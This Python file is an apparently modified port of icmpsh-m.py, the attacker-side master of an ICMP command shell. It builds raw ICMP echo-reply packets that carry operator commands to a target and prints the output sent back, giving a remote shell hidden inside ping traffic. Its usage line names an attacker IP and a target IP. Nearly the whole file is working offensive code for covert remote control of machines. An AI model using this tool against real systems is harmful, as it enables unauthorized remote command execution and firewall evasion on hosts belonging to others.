#!/usr/bin/env python
#
#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in
#  Perl by Nico Leidecker <nico@leidecker.info>)
#
#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>
#
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os
import pdb
import select
import socket
import sys
import fcntl

from pwn import *
from impacket import ImpactDecoder
from impacket import ImpactPacket


def ctrlc(signal, frame):
	log.warn("Exit by user...")
	sys.exit(0)


def set_standart_input_non_blocking_file():
	# Make standard input a non-blocking file
	file_descriptor = sys.stdin.fileno()
	flags = fcntl.fcntl(file_descriptor, fcntl.F_GETFL) | os.O_NONBLOCK
	fcntl.fcntl(file_descriptor, fcntl.F_SETFL, flags)


def exit_if_running_on_windows():
	if os.name == "nt":
		log.failure("icmpsh master can only run on Posix systems")
		sys.exit(255)


def exit_if_not_run_as_root():
	if os.geteuid() != 0:
		log.failure("Icmpsh master need Root privileges (Sudo)")
		sys.exit(1)


def connection_lost():
	log.failure("Connection is lost!")
	exit(1)


def get_interactive_shell(sock, ip_object, icmp, ip_decoder, src, dst):
	while sock in select.select([sock], [], [])[0]:
		buff = sock.recv(4096)
		if not buff:
			connection_lost()

		# Packet received; decode and display it
		ippacket = ip_decoder.decode(buff)
		icmppacket = ippacket.child()

		is_received_packet_relative_to_the_sent_packet = (
			ippacket.get_ip_dst() == src
			and ippacket.get_ip_src() == dst
			and 8 == icmppacket.get_icmp_type()
		)

		if is_received_packet_relative_to_the_sent_packet:
			# Get identifier and sequence number
			ident = icmppacket.get_icmp_id()
			seq_id = icmppacket.get_icmp_seq()
			data = icmppacket.get_data_as_string()

		if data:
			message_trace = (
				f"{len(data)} bytes from {src}: icmp_seq={seq_id} icmp_id={ident}"
			)
			log.info(message_trace)
			sys.stdout.write(data.decode("utf-8"))

		cmd = sys.stdin.readline()
		if cmd == b"exit\n":
			return

		# Update the icmp object with idententification, sequence number and data, and finally, respective checksum.
		icmp.set_icmp_id(ident)
		icmp.set_icmp_seq(seq_id)
		icmp.contains(ImpactPacket.Data(cmd))
		icmp.set_icmp_cksum(0)
		icmp.auto_checksum = 1

		# Update ip_object with the icmp data, and send it via the socket
		ip_object.contains(icmp)
		sock.sendto(ip_object.get_packet(), (dst, 0))
	else:
		connection_lost()


def main(src, dst):
	exit_if_running_on_windows()
	exit_if_not_run_as_root()
	set_standart_input_non_blocking_file()

	# Create a raw socket ICMP
	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
	sock.setblocking(0)
	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

	# Create a new IP packet and set its source and destination addresses
	ip_object = ImpactPacket.IP()
	ip_object.set_ip_src(src)
	ip_object.set_ip_dst(dst)

	# Create a new ICMP packet of type ECHO REPLY
	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

	# Instantiate an IP packets ip_decoder
	ip_decoder = ImpactDecoder.IPDecoder()

	# Get the interactive shell
	get_interactive_shell(sock, ip_object, icmp, ip_decoder, src, dst)


if __name__ == "__main__":
	if len(sys.argv) < 3:
		log.warn("./icmpsh-m.py <attacker IP address> <target IP address>\n")
		sys.exit(1)

	signal.signal(signal.SIGINT, ctrlc)
	main(sys.argv[1], sys.argv[2])
